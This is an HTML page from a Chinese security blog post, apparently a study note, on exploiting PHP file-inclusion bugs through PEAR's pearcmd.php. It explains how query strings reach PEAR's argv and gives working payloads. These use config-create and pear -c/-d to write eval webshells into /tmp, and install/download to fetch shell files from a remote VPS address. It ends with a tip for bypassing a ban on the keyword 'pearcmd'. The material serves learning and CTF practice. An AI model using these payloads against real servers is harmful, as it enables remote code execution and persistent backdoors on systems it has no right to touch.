@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hah.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="pearcmd.php好看，爱看，多看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用pearcmd.php进行文件包含">
+<meta property="og:url" content="https://fupanc.github.io/2024/04/28/pearcmd.php/index.html">
+<meta property="og:site_name" content="Fupanc">
+<meta property="og:description" content="pearcmd.php好看，爱看，多看">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240427211536292.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240427210050568.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240426222128934.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240426222206499.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240426222235994.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240427223551642.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240427224040193.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240428013848033.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240428014007326.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240428015602654.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240428022500841.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240428022535506.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240428032008052.png">
+<meta property="article:published_time" content="2024-04-27T19:37:03.502Z">
+<meta property="article:modified_time" content="2024-04-27T19:39:55.813Z">
+<meta property="article:author" content="Fupanc">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fupanc.github.io/2024/04/28/pearcmd.php/image-20240427211536292.png">
+
+
+<link rel="canonical" href="https://fupanc.github.io/2024/04/28/pearcmd.php/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/04/28/pearcmd.php/","path":"2024/04/28/pearcmd.php/","title":"利用pearcmd.php进行文件包含"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>利用pearcmd.php进行文件包含 | Fupanc</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Fupanc</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#pearcmd-php"><span class="nav-number">1.</span> <span class="nav-text">pearcmd.php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.0.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.0.3.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#config-create"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">config-create</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#install"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">install</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#download"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">download</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">写入配置文件</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.4.</span> <span class="nav-text">小绕过</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fupanc"
+      src="/images/index.jpg">
+  <p class="site-author-name" itemprop="name">Fupanc</p>
+  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/04/28/pearcmd.php/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/index.jpg">
+      <meta itemprop="name" content="Fupanc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fupanc">
+      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="利用pearcmd.php进行文件包含 | Fupanc">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用pearcmd.php进行文件包含
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-04-28 03:37:03 / 修改时间：03:39:55" itemprop="dateCreated datePublished" datetime="2024-04-28T03:37:03+08:00">2024-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url" rel="index"><span itemprop="name">文件包含</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
+<span id="more"></span>
+
+<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
+<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
+<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>有pear扩展（这样才能有pearcmd.php）</li>
+<li>php开启了<code>register_argc_argv</code>选项</li>
+<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
+<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
+</ul>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
+<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
+<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
+<p>看一看可以利用的参数：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
+<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
+<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
+<ul>
+<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
+</ul>
+<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
+<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
+<ul>
+<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
+</ul>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
+<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
+<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
+<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
+<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
+<p>构造出的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
+<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
+<p><strong>对比一下即可：</strong></p>
+<p>正常抓包后传参：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
+<p>直接传参结果如下：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
+<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
+<p>但是第二章图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
+<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
+<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
+<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
+<p>使用的payload为(基本上不行，主要看下面那个)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>
+
+<p>同样还是抓包传payload（方便），页面回显</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
+<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
+<p><strong>另外的payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包放包后页面如下：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
+<p>这里给出了路径，然后去包含这个路径即可</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
+<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
+<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>这个是直接下载到当前页面。</p>
+<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>
+
+<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
+<p>其他的利用方式，个人感觉挺好的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>
+
+<p>看看选项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>
+
+<p>相当于写配置到<code>/tmp/.feng.php</code>,payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>
+
+<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
+<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
